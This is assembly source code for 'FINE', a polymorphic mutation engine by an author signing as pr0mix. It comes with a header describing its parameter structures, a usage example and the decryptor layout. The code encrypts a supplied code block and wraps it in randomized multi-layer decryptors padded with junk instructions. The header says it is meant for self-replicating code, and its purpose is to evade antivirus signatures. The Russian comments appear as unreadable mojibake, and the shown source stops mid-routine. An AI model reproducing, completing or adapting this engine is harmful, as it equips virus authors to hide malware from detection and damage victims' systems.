;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;                                                                                                 		 ;
;                         xxxxxxxxxxx                        xxxxxxxxxxx								 ;
;                         xxxxxxxxxxx                        xxxxxxxxxxx                                 ;
;                         xxxx          xxxx   xxxxxxxxxx    xxxx                                        ;
;                         xxxx          xxxx   xxxxxxxxxxx   xxxx                                        ;
;                         xxxxxxxx             xxxx   xxxx   xxxxxxxx                                    ;
;                         xxxxxxxx      xxxx   xxxx   xxxx   xxxxxxxx                                    ;
;                         xxxx          xxxx   xxxx   xxxx   xxxx                                        ;
;                         xxxx          xxxx   xxxx   xxxx   xxxx                                        ;
;                         xxxx          xxxx   xxxx   xxxx   xxxxxxxxxxx                                 ;
;                         xxxx          xxxx   xxxx   xxxx   xxxxxxxxxxx                                 ;
;                                                                                                     	 ;	
;                                                                                                        ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;									Flying mutatIoN Engine												 ;
;											FinE 														 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ;
;											:)!															 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;										�㭪�� FINE													 ;
;								 ������� ��������� ������											 ;
;																										 ;
;																										 ;
;����:																									 ; 
;1 ��ࠬ��� (� �����⢥���) - ���� �������� (MORPHGEN) (�� ���ᠭ�� ᬮ�� ����)						 ;
;--------------------------------------------------------------------------------------------------------;
;�����:																									 ;
;EAX - ���� ᮧ������� ���ਯ�� � ����஢���� ����� 												 ;
;ECX - ࠧ��� ᮧ������� ���ਯ�� � ����஢���� �����												 ;
;+ ������ ��� �� ������ � ᯥ�. ���� �������� (ᬮ�� ����)											 ;	
;--------------------------------------------------------------------------------------------------------;
;�������:																								 ;
;�������, 㪠��⥫� �� ������ ��।�� � ����⢥ ��ࠬ���, �� �������, �.�. ����� � ��� ��᫥ 	 ;
;�맮�� �������䭮�� ������ ������� ⥬� �� (�஬�, �����, ᯥ樠�쭮 �।�����祭��� ��� ���������).	 ;
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;  
;																										 ;
;											!															 ;
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ;
;									�������� ���������													 ;
;										 MORPHGEN														 ;
;							(0 - �室��� ��ࠬ���, 1 - ��室���) 										 ;
;																										 ;
;																										 ;
;MORPHGEN	struct																						 ;
;	rgen_addr			dd	?	;���� ������� ���砩��� ��ᥫ (���)								(0)	 ;
;	tgen_addr			dd	?	;���� ������� ������ ������権								(0)  ;	
;	cryptcode_addr		dd	?	;���� ����, ����� ���� ����஢���								(0)	 ;
;	size_cryptcode		dd	?	;ࠧ��� ����, ����� ���� ����஢���								(0)	 ;
;	pa_buf_for_morph	dd	? 	;䨧. ���� ����, �㤠 ������� ���ਯ�� � ��஢���� �����		(0)	 ;
;	va_buf_for_morph	dd	?	;����. ���� ����, �㤠 ������� ���ਯ�� � ��஢���� �����	(0)  ;	
;	buf_with_morph		dd	?	;䨧. ����, ��� �ᯮ����� ᮧ����� ���ਯ�� � ��஢���� �����	(1)  ;	
;	size_morph			dd	?	;ࠧ��� ⮫쪮 �� ᮧ������� ���ਯ�� � ��஢���� ����� 		(1)	 ;
;	mapped_addr			dd	?	;��१�ࢨ஢���   (���� ���� ����� (��� ���� 䠩�� � �����)) 	(0)	 ;   
;	reserv1 			dd	?	;��१�ࢨ஢���													(0)  ;	
;MORPHGEN	ends																						 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;									�������� ��������� 												 	 ;
;									      TGEN 															 ;
;									 (aka TRASHGEN) 													 ; 
;						(����� ��⠫쭮� ���ᠭ�� ᬮ�� � ������ xTG)									 ; 
;																										 ;
;																										 ;
;TRASHGEN	struct																						 ;
;	rgen_addr		dd		?	;���� ������� ���砩��� ��ᥫ (���)									 ;
;	buf_for_trash	dd		?	;���� (����), �㤠 �����뢠�� ������㥬�� (��, ����⢥����) ���쬮	 ;
;	size_trash		dd		?	;ࠧ��� (� �����), ᪮�쪮 ���� �������  							 ;
;	regs			dd		?	;������ ॣ����� (2 ��)  												 ;
;	xmask1			dd		?	;64-��⭠� ��᪠ ��� �����樨  										 ;
;	xmask2			dd		?	;������ ������ (��� 䨫���)											 ;
;	beg_addr		dd		?	;��砫�� ����														 ;
;	end_addr		dd		?	;������ ���� 														 ;
;	mapped_addr		dd		?	;��१�ࢨ஢��� (���� ���� ����� (��� ���� 䠩�� � �����))			 ;   
;	reserv1			dd		?	;��१�ࢨ஢��� (�, ����� �����-� ⠬ �� � �㤥�) 					 ; 
;TRASHGEN	ends																						 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;											! 															 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ;
;							��������� � ����� ��������� MORPHGEN: 										 ; 
;																										 ;
;																										 ;
;[   rgen_addr   ] : 																					 ; 
;					 ⠪ ��� ����� ������ (FINE) ࠧࠡ�⠭ ��� �ਢ離� � ������-���� ��㣮�� �����,	 ;
;					 � ��� �����樨 ���� (� �������� ��㣨� ��) ����� ���, ���⮬� ���� ��� 		 ; 
;					 �࠭���� � (������) ���� ��������. 		 										 ;
;					 �����: �᫨ ���� FINE �㤥� �ᯮ�짮���� ��㣮� ��� (� �� ��, ����� 	 		 ;
;					 ���� � ��� � ��������), ����, �⮡� ��� ��㣮� ��� �ਭ���� � ����⢥ 1-�� 		 ;
;					 (� �����⢥�����!) ��ࠬ��� � ��� �᫮ (������� ��� N), ⠪ ��� ���� �㤥� � 	 ;
;					 ��������� [0..n-1]. � �� ��室� ��㣮� ���	������ �������� � EAX ��砩��� �᫮. ; 	
;					 ��⠫�� ॣ����� ������ ������� ��������묨. ��. 			 					 ; 
;--------------------------------------------------------------------------------------------------------; 
;[	 tgen_addr	 ] : 																					 ;
;					 �������筮, ��� � � �।��騬 ����� ��������. ���쪮 ⮣�� ������� ����		 ;
;					 ������ ���� �ਢ���� � ����, ��� xTG (� ���㦭�� ����� ����� ��।����� �㫨 � ��	 ;
;					 ⨯-⮯).   																		 ;
;--------------------------------------------------------------------------------------------------------;
;[ cryptcode_addr ]  																					 ;
;		 &																								 ;
;[ size_cryptcode ]: 																					 ;
;					 �㬠�, ����� � ⠪ �� �᭮. 														 ;
;--------------------------------------------------------------------------------------------------------;
;[pa_buf_for_morph] : 																					 ; 
;					 � �⮬ ���� ��।��� 䨧��᪨� ���� �뤥������� ���� ��� ᮧ����� ���ਯ��.	 ;
;					 ���� ����� �뤥���� ���ਬ�� VirtualAlloc etc (��� 㣮���). �᫨ �� ������ 		 ;
;					 ��ࠬ���� � ������ ������, ࠧ��� �⮣� ���� ⮣�� �㤥� ࠢ��: 					 ;
;					 0x3000 + ࠧ��� ����, ����� ���� ����஢��� (ࠧ��� ���� � ����ᮬ).  			 ;
;					 ����� �⮨� ᪠����, ��:															 ;
;					 	1) �뤥����� ���� ������ ���� ���㫥�, �.�. ������ ⮫쪮 �� �㫥��� ���� 	 ;
;						   (��-�� ᯥ�䨪� ������� ������ (ᬮ�� ��室����));  						 ;
;						2) ��� 㧭���, ᪮�쪮 ���� �뤥���� ��� ������� ������? ��⠥�: �����, 		 ;
;						   ( ࠧ��� ����, ����� ���� ����஢��� ) 									 ;
;											+															 ;
;						   ( 30 (max ���-�� �᭮���� ������, ��, �� �� �⮫쪮 �� ��������) * 		 ;
;							 ����� ���� )															 ;
;						   					+															 ;
;						   ( 15 (��� ����� �᭮���� �������) *30 )										 ;
;											+															 ;
;									�� ��直� ��砩													 ;
;					 ������, ᪠�� ⠪: �᫨ ���㫮, ����� �뤥�� ����� ����. 					 ;
;					 ���: �᫨ �ᯮ������ ���⨤��ਯ�୮���, � ���� �뤥���� �� ����� ����.	 ;
;					 ���: �᫨ �� ��� ᮧ����, � �ਬ���, 3 ���ਯ�� c ���樥� ���� 100 ����, 	 ;
;						  � ����� ᬥ�� �뤥���� 0x5000 ���� + ࠧ��� ����, ����� ���� ����஢���. 	 ;
;					 ����, ���� ����, �� ࠧ������.													 ;
;--------------------------------------------------------------------------------------------------------;
;[va_buf_for_morph] :																					 ; 
;					 � �⮬ ���� ����� ᬥ�� ����� 0. ������ �ᯮ�짮������ ��� ������ ������� call � 	 ;
;					 ���ਯ�� �� �����������塞� �������. 											 ;
;--------------------------------------------------------------------------------------------------------;  
;[ buf_with_morph ]:																					 ;
;					 � �� ���� �������� ����, ��� �ᯮ����� ⮫쪮 �� ᮧ����� ���ਯ�� � 		 ;
;					 ��஢���� �����. ��.  															 ;
;--------------------------------------------------------------------------------------------------------;
;[	size_morph	 ] :																					 ;
;					 � �� ���� �������� ࠧ��� (�⠩ ���). � ⠪ �� ����⭮. 					 	 ;
;--------------------------------------------------------------------------------------------------------; 
;[  mapped_addr  ] :																					 ;
;					 � �� ���� �������� ���� ����� (��� ���� 䠩�� � �����). �� ����� ������ � �� ; 
;					 ���� ����� �㯮 ����� 0 ��� �� 㣮���. ����, ��⠩, �� �� ���� 				 ;
;					 ��१�ࢨ஢���. ����� ��.   														 ;  
;			 																							 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;                         
;																										 ;
;											y0p!														 ;
;																										 ;  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;											����														 ;
;																										 ;
;																										 ;
;(+) ������� ������� ॣ���஢ 																		 ; 
;--------------------------------------------------------------------------------------------------------; 
;(+) ������� ࠭������ ���祩 ��� ��஢����															 ;  																	 
;--------------------------------------------------------------------------------------------------------;
;(+) ࠧ��� ���ਯ�� �ᥣ�� ࠧ�� 														 			 ; 
;--------------------------------------------------------------------------------------------------------;
;(+) ������� ���ਯ�� ����� �����������塞� �������樨												 ; 
;--------------------------------------------------------------------------------------------------------;
;(+) ������� ���ਯ�� ����� �� ��� ��� �� ��㣮� (�離� jmp'���)									 ;
;--------------------------------------------------------------------------------------------------------;
;(+) �ᯮ�짮����� ��� � ������� ���� (�ᮡ���� ᢮��, ⠪ �� ����� ���⥫쭮)					 ; 
;--------------------------------------------------------------------------------------------------------;
;(+) ��᪮�쪮 �����⬮� ��஢���� ���� (ADD/SUB/XOR)													 ;
;--------------------------------------------------------------------------------------------------------;
;(+) ���⨤��ਯ�୮��� (����� ����� ������� ������ �롮� ������⢠ ���ਯ�஢)					 ; 
;--------------------------------------------------------------------------------------------------------;
;(+) ����������ᨬ����																					 ;
;--------------------------------------------------------------------------------------------------------;
;(+) ��� �ਢ離� � ��㣨� ������� (��� & trashgen ����� �� �� - �᫮��� �⠩ ���;)				 ; 
;		* ����� ��������� ��� ᠬ����⥫�� �����;													 ;            
;--------------------------------------------------------------------------------------------------------; 
;(+) �� �� WinAPI																					 ;
;--------------------------------------------------------------------------------------------------------;
;(+) �� �ᯮ���� ����� � �����-ᬥ饭��, �㯥� ��� ���樨 �����. 									 ; 
;																										 ; 				
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;											y0p!														 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;										�������������: 													 ;
;																										 ;
;																										 ;
;1) ������祭��:																						 ;
;		FinE.asm																						 ; 
;2) �맮� (�ਬ�� stdcall):																				 ;
;		...																								 ;
;		szBuf		db 100 		dup (00h) 																 ; 
;		szBuf2		db 5000h	dup (00h) ;! ��易⥫쭮 ���㫨��! 										 ;
;		...										      													 ;
;		lea		ecx,szBuf																				 ;
;		lea		edx,szBuf2 																				 ;
;		assume	ecx:ptr MORPHGEN																		 ;
;		mov		[ecx].rgen_addr,00401000h		;�� �⮬� ����� ������ ��室����� ���					 ;
;		mov		[ecx].tgen_addr,00401300h		;�� �⮬� ����� ������ ��室����� ���裥� 				 ; 
;		mov		[ecx].cryptcode_addr,00402000h	;�� �⮬� ����� ��室���� ���, ����� �� �����㥬 	 ; 
;		mov		[ecx].size_cryptcode,100		;ࠧ��� �⮣� ���� 										 ; 
;		mov		[ecx].pa_buf_for_morph,edx		;���� ��� ᮧ����� ���ਯ�� � ��஢���� �����		 ; 
;		mov		[ecx].va_buf_for_morph,0		;�� ���� ���� �� �� ����, ���⮬� �⠢�� ᬥ�� 0.	 ;
;												;[ecx].buf_with_morph	- ��室��� ��ࠬ���				 ;
;												;[ecx].size_morph		- ��室��� ��ࠬ��� 			 ;   
;												;��⠫�� ��ࠬ���� ���㫥��.							 ;
;		call	FINE							;��뢠�� ��������� ������  					 		 ; 	
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ;
;										������ ����������:												 ;
;																										 ;
;																										 ;
;		call			imm32			;����� �������� ⥪�饥 ���⮭�宦����� ���ਯ��			 ;
;		pop				reg1			;� ��࠭���� � ॣ���� reg1 									 ;
;		push			imm32			;� ��� �������� ࠧ��� ����, ����� ���� ����஢��� 		 ;
;		add				reg1,imm32		;ॣ���� reg1 㪠�뢠�� �� ����� ����, ����� ���� ����஢��� ;
;		mov				reg2,imm32		;� reg2 ᮤ�ন��� ���� ��� ����஢�� ����					 ;
;	--> xor/add/sub		[reg1],reg2		;����஢�� ����												 ;
;	|	xor/add/sub		reg2,imm32		;���� ��������� ������ �����⬮�							 ;
;	|	dec				reg1			;㬥��蠥� �� 1 reg1											 ;
;	|	dec				[esp]			;㬥��蠥� �� 1 ࠧ���											 ;
;	----jne				imm32			;���室 �� ����஢�� ����									 ;
;		pop				reg				;����⠭�������� ���   										 ;
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;v1.0.1    
;������� ���筮 ������� �����, ���⮬� �������� �।�� � ���. 




													;m1x
												;pr0mix@mail.ru
											;EOF 





;======================================================================================================== 

;========================================================================================================
;������� MORPHGEN, ����室���� ��� ������� ������� 
;========================================================================================================
MORPHGEN	struct
	rgen_addr			dd		?
	tgen_addr			dd		?
	cryptcode_addr		dd		?
	size_cryptcode		dd		?
	pa_buf_for_morph	dd		?
	va_buf_for_morph	dd		?
	buf_with_morph		dd		?
	size_morph			dd		?
	mapped_addr			dd		? 
	reserv1 			dd		? 
MORPHGEN	ends

;========================================================================================================
;������� TGEN, ����室���� ��� ������� ������� (aka TRASHGEN, ���ᠭ�� ᬮ�� � xTG)  
;========================================================================================================
TGEN	struct
	rgen_addr		dd		?
	buf_for_trash	dd		?
	size_trash		dd		?
	regs			dd		?
	xmask1			dd		?
	xmask2			dd		?
	beg_addr		dd		?
	end_addr		dd		?
	mapped_addr		dd		? 
	reserv1			dd		?	
TGEN	ends
;========================================================================================================

num_decrypts			equ		3				;������⢮ ᮧ�������� ���ਯ�஢ 
mtrash1					equ		0FFFFFFFFh		;��᪠ ��� ���裥�� (�᫨ �� �� ��) - ����� ���⠢��� ��� �����樨 ��������᪮�� ���쬠 ��� �����⮣� 堮�  
mtrash2					equ		000h			;���� �������� ��᪨ 

num_general_instr		equ		11				;������⢮ �᭮���� ������ (������ ���ਯ��, �� ���� ����� ����� ����) 
size_general_instr		equ		15				;���ᨬ���� ࠧ��� ����� �᭮���� �������  (����� 㬥�����, � �ਬ��� �� 10 etc) 
num_steps				equ		30				;���稪 (� ��� �⠩ ����) 
portion					equ		100				;���� ����� ���� 
max_portion				equ		portion*num_general_instr+size_general_instr*num_general_instr	;���ᨬ���� ࠧ��� ����� ���樨 ����)  - 祬 ����� �� ���祭��, ⥬ ����� ����⭮���, �� ������� ����⠢���� � ��砩��� ���浪� (ᬮ�� ��室���)   
min_portion				equ		50 				;��������� ࠧ��� ���樨 ���� 

addr1					equ		000h			;��砫�� � ������ ���� ��� ���裥�� (�᫨ �� �� ��) 
addr2					equ		000h

;======================================================================================================== 








FINE:
	pushad										;save all regs  
	cld
	mov		edx,dword ptr [esp+24h]				;� edx - 㪠��⥫� �� c������� MORPHGEN  
	assume	edx:ptr MORPHGEN
	mov		ecx,[edx].size_cryptcode			;ecx - ࠧ��� ����, ����� ���� ����஢��� 
	mov		esi,[edx].cryptcode_addr			;esi - ���� �⮣� ���� 
	mov		edi,[edx].pa_buf_for_morph			;edi - ���� (�� �� ����), �㤠 ����襬 ���ਯ�� � ����஢���� �����
	xor		eax,eax								;����� ������ � ��� (� ������塞 ������� ����) �������� TGEN (aka TRASHGEN) 
	push	eax									;reserv1
	push	[edx].mapped_addr					;mapped_addr  
	push	addr2								;end_addr
	push	addr1								;beg_addr (�� ��� �⠩ � ������ xTG)
	push	mtrash2								;64-��⭠� ��᪠ ��� �����樨 ���� 
	push	mtrash1
	push	eax;regs							;ॣ����� (���� ������ �㫨, � �ࠢ��쭮 �������� ��᫥, ���砩 ��室����) 
	push	eax;portion							;����� ����, ������ ���� ᣥ���஢���
	push	eax;buf_for_trash					;����, �㤠 �����뢠�� ����� ���� 
	push	[edx].rgen_addr						;��� 
	mov		ebp,esp								;㪠��⥫�� �� ������ �������� �㤥� ॣ���� ebp
	assume	ebp:ptr TGEN						;[ebp+-00]
	mov		eax,num_decrypts					;������⢮ ���ਯ�஢
_next_decrypt_:
	push	eax									;[ebp-04]
	call	morph								;[ebp-08]     ;��뢠�� �㭪�� ᮧ����� ᥣ� ���ਯ�� � ��஢���� �����  
	mov		esi,edi								;esi ������ ࠢ�� ��砫� ⮫쪮 �� ᮧ������� ���ਯ�� 
	add		edi,ecx								;edi ��ॢ���� �� ����� ⮫쪮 �� ᮧ������� ���ਯ�� + ��஢���� ⥪��  
	pop		eax
	dec		eax									;㬥��蠥� ���稪
	jnz		_next_decrypt_						;���� ��ਪ �� ������� ���ਯ��? 
	add		esp,10*4							;����� �� �� ���� ����ᠫ�, ��ࠢ������ ��� 
	sub		edi,ecx								;���४��㥬 edi �� ��砫� ��᫥����� ᮧ������� ���ਯ�� 
	mov		[edx].buf_with_morph,edi			;��࠭�� �� ���祭�� � �������
	mov		[edx].size_morph,ecx				;� ⠪�� ��࠭�� ࠧ��� ������� ���ਯ�� + ��஢������ ⥪�� 
	mov		dword ptr [esp+1Ch],edi				;EAX=EDI
	mov		dword ptr [esp+18h],ecx				;ECX=ECX   
	popad										;����⠭�������� ॣ�����
	ret		4									;��室�� 
;========================================================================================================
morph:
	call	gen_reg								;��뢠�� �㭪�� �����樨 ������� ॣ���஢ (�ᯮ��㥬��) (2 ��)    
	push	edi									;[ebp-12]     ��࠭塞 edi � ��� 
	push	portion								;ᣥ����㥬 � ᠬ�� ��砫� 1-�� ����� ���� 
	call	[edx].rgen_addr
	add		eax,41								;�� ��������  										
	call	gen_trash  
;--------------------------------------------------------------------------------------------------------
	push	edi									;[ebp-16]     ;����� ���� �㤥� ���������� (�㦭� ��� ���᪠ ᢮������� �������� ����) 
	push	edi									;[ebp-20]     ;���� �ࠧ� ��᫥ call $+5 (��࠭���� ��᫥ � reg1)     
	call	instr___call						;CALL $+value 

    call	instr___pop__reg					;POP reg1 

    call	instr___push__imm					;PUSH <size> 

    push	edi									;[ebp-24]     ;��࠭�� �� ���� (� �����맢����� �㭪樨 ��� �ࠢ��쭮 ᪮�४��㥬), �⮡� ��᫥ ������� �ࠢ���� ࠧ��� ��᫥ �� �⮬� �����   
    call	instr___add__reg_imm				;ADD reg1,<trash+size=���� ���� �ਯ⮢������ ����> 

    push	edi									;[ebp-28]     ;��࠭�� � �� ����, ����� ��᫥ ���襬 ����1, �� ���஬� � �㤥� ����஢뢠�� ����� (���) 
    call	instr___mov__reg_imm				;MOV reg2,key1 

    push	edi									;[ebp-32]     ;��࠭�� ⠪�� � ��� ����, ��� �᫮��� ���室 �㤥� 㪠�뢠�� ������ �  
    push	edi									;[ebp-36]     ;����� �࠭���� �᫮ - ����� ��� �ਯ⮢�� ��   
    call	instr___addxorsub__addrreg_reg		;ADD/XOR/SUB dword ptr [reg1],reg2  

    push	edi									;[ebp-40]     ;� ����� ���襬 ����2, �� ��� ���� �㤥� ���������� ����1  
    push	edi									;[ebp-44]     ;����� �࠭���� 2-�� �᫮ - ����� 2-�� ���� ��� ��������� 1-��� ���� ��          
    call	instr___addxorsub__reg_imm			;ADD/XOR/SUB reg2,key2  

    call	instr___dec__reg					;DEC reg1 

    call	instr___dec__addresp				;DEC dword ptr [esp], JNE <value32>  

    call	instr___pop__reg					;POP reg  
;--------------------------------------------------------------------------------------------------------    
	push	portion
	call	[edx].rgen_addr						;��砩�� ��ࠧ�� ��।����, ᪮�쪮 ���� (� �����) ������� 
	push	eax
	add		eax,ecx								;������� ࠧ��� ������, ����� ���� �㤥� ����஢��� ���ਯ�஬ 
	call	goto_free_addr						;� �맮��� �㭪�� ����祭�� ��砩���� ᢮������� ���� � �������� (��࠭��) �஬���⪥, � �� �⮬� ����� � �㤥� ᥩ�� �����뢠�� 

	add		eax,(max_portion+portion+portion+min_portion)	;⠪�� ᪮�४��㥬 (�⮡� �� �ࠢ��쭮 ��ࠡ�⠫�) ����� ࠧ���    
	add		dword ptr [ebp-16],eax				;� ������� � �������饬��� ����� (�� 㪠�뢠�� ⥯��� �� ᢮������ ����, �㤠 �㤥� �����뢠�� ��।��� ���ਯ�� etc)  
	pop		eax
	call	gen_trash							;������㥬 ����� ����  
;--------------------------------------------------------------------------------------------------------
	push	-1
	call	[edx].rgen_addr
	xchg	eax,ebx								;� ebx ⥯��� �࠭���� ����1 
	push	-1
	call	[edx].rgen_addr
	push	eax									;[ebp-48]     ;� � ��� ⥯��� �࠭���� ����2 
;--------------------------------------------------------------------------------------------------------
	mov		eax,dword ptr [esi]					;� ��稭��� ��஢��� ��� 
	add		esi,4  
_crypt_:
	;mov		eax,dword ptr [esi]
	cmp		dword ptr [ebp-36],1				;optimization!     ;ᬮ�ਬ, ����� ������ ��஢�� �� �롨ࠫ�, � �롨ࠥ� ᨬ������ ��� ����஢�� 
	jl		_xor03_												            
	jg		_add03_
_sub03_:
	sub		eax,ebx
	jmp		_chg_key1_

_add03_:
	add		eax,ebx
	jmp		_chg_key1_ 

_xor03_: 
	xor		eax,ebx

_chg_key1_:
	cmp		ecx,1								;optimization!     ;ᬮ�ਬ, �� ��᫥���� �����? �᫨ ��, � �������� ����1 �� ����2 㦥 �� ����  
	je		_write_crypt_data_ 
	cmp		dword ptr [ebp-44],1				;optimization!     ;ᬮ�ਬ ����� ��� �� �ᯮ�짮���� ��� ��������� ����1 (�� ����2) 
	jl		_xor04_
	jg		_add04_
_sub04_:
	sub		ebx,dword ptr [esp]
	jmp		_write_crypt_data_

_add04_:
	add		ebx,dword ptr [esp]
	jmp		_write_crypt_data_

_xor04_:
	xor		ebx,dword ptr [esp]
	 
_write_crypt_data_:
	mov		dword ptr [edi],eax
	inc		edi
	lodsb
	ror		eax,8								;��६ ᫥���騩 ����, � ��稭��� ��஢��� �����  
	;inc		esi
	loop	_crypt_
;--------------------------------------------------------------------------------------------------------		  	
	pop		ecx									;key2

	pop		eax
	pop		eax
	mov		dword ptr [eax],ecx					;���᪨���� �� ��� ࠭�� ��࠭���� ����2 � ����, �� ���஬� � ����襬 � ���ਯ�� ����� ���稪  

	pop		eax
	pop		eax    
	pop		eax
	mov		dword ptr [eax],ebx					;���᪨���� �� ��� ����, �� ���஬� � ����襬 � ���ਯ�� ����1  

	dec		edi									;���४��㥬 edi 
	xchg	eax,edi								;����� ���᪨���� ����, �� ���஬� ���� ������� ࠧ��� ��஢����� ���� + ���� (� ���� reg1 ������ 㪠�뢠�� �� ����� ��஢������ ����) 
	pop		edi
	pop		esi
	sub		eax,esi
	test	byte ptr [edi-1],20h;0E8h			;��᫥ ᬮ�ਬ, ����� ������� �뫠 ����ᠭ�: ADD ��� SUB ? � � ���ᨬ��� �� �⮣� �����塞 ���� ॣ���� 
	je		_addregimm_
_subregimm_:
	neg		eax
_addregimm_: 
	stosd  

	pop		ecx									;����砥� ����, �� ���஬� ����� �㤥� �����뢠�� ���� ���ਯ�� (�� ����� 祬 ��, �� � edi) 
	pop		edi									;����砥� ���� ��砫� ⮫쪮 �� ����ᠭ���� ���ਯ�� 
	sub		ecx,edi								;����塞 � ��࠭塞 � ecx ࠧ��� ⮫쪮 �� ����ᠭ���� ���ਯ�� + ��஢������ ����  
                
	ret											;��室��
;========================================================================================================	 





;=====================================[CALL $+value]=====================================================
instr___call: 
	push	portion
	call	[edx].rgen_addr						;����砥� ������ ࠧ��� 1-�� ���樨 ����, ������ �㤥� ������� � �����뢠�� 
	push	eax									;��࠭塞 
	push	portion
	call	[edx].rgen_addr						;����砥� ������ ࠧ��� 2-�� ���樨 ����
	push	eax									;��࠭塞 � ��� 
	push	portion
	call	[edx].rgen_addr						;����砥� ������ ࠧ��� 3-�� ���樨 ���� 
	push	eax									;� ��� ⠪�� ��࠭塞 � ��� 
	add		eax,dword ptr [esp+4]
	add		eax,dword ptr [esp+8]				;����砥� ��騩 ࠧ���  
	call	goto_free_addr						;����砥� ������ ᢮����� ���� � ��࠭�� �������� �஬���⪥, �� ���஬� �������� �⮫쪮 ���� + �㦭�� ������� (� ������ ��ਪ� �� call $+5) 
	pop		eax									;���᪨���� �� ��� ࠭�� ��࠭���� ࠧ��� ���� 
	call	gen_trash							;���ਬ ����
	mov		al,0E8h								;����� ����ਬ ������� CALL $+value 
	stosb
	pop		eax
	stosd
	mov		dword ptr [ebp-20],edi 
	call	gen_trash							;�����뢠�� ��।��� ����� ����  
	pop		eax
	call	gen_trash							;etc  
  	
	ret											;�� ��室  
;=====================================[CALL $+value]===================================================== 





;=======================================[POP reg1]=======================================================  
instr___pop__reg:
	push	portion								;etc (ᬮ�� ���) 
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr
	push	eax
	add		eax,dword ptr [esp+4]  
	call	goto_free_addr
	pop		eax
	call	gen_trash 
;--------------------------------------------------------------------------------------------------------
	push	2									;����� ᬮ�ਬ, ����� ������� �������?
	call	[edx].rgen_addr
	test	eax,eax
	je		_pop__reg1_							;POP reg1 ���
;--------------------------------------------------------------------------------------------------------
_mov__reg1_addresp___add__esp_4_:				;MOV reg1,[esp]   add esp,4    ? 
	mov		al,8Bh
	stosb
	mov		al,bh
	shl		eax,3
	add		al,4
	stosb
	mov		al,24h
	stosb
	pop		eax
	call	gen_trash 
	push	portion
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr
	push	eax
	add		eax,dword ptr [esp+4]
	call	goto_free_addr
	pop		eax
	call	gen_trash
	mov		ax,0C483h
	stosw
	mov		al,04
	jmp		_iprendtrash_ 
;--------------------------------------------------------------------------------------------------------
_pop__reg1_:
	mov		al,58h
	add		al,bh

_iprendtrash_: 
	stosb
	pop		eax
	call	gen_trash 
	ret
;=======================================[POP reg1]======================================================= 





;=======================================[PUSH imm]======================================================= 
instr___push__imm:
	push	portion
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr
	push	eax
	add		eax,dword ptr [esp+4]
	call	goto_free_addr
	pop		eax
	call	gen_trash
;--------------------------------------------------------------------------------------------------------
	push	2									;PUSH imm ��� 
	call	[edx].rgen_addr						;MOV reg2,imm   PUSH reg2      ? 
	test	eax,eax
	je		_push__imm_
;--------------------------------------------------------------------------------------------------------
_mov__reg2_imm___push__reg2_:
	mov		al,0B8h
	add		al,bl
	stosb 
	mov		eax,ecx
	stosd
	pop		eax
	call	gen_trash
	push	portion
	call	[edx].rgen_addr
	push	eax
	push	portion
	call	[edx].rgen_addr
	push	eax
	add		eax,dword ptr [esp+4]
	call	goto_free_addr
	pop		eax
	call	gen_trash  

	mov		al,50h
	add		al,bl
	stosb
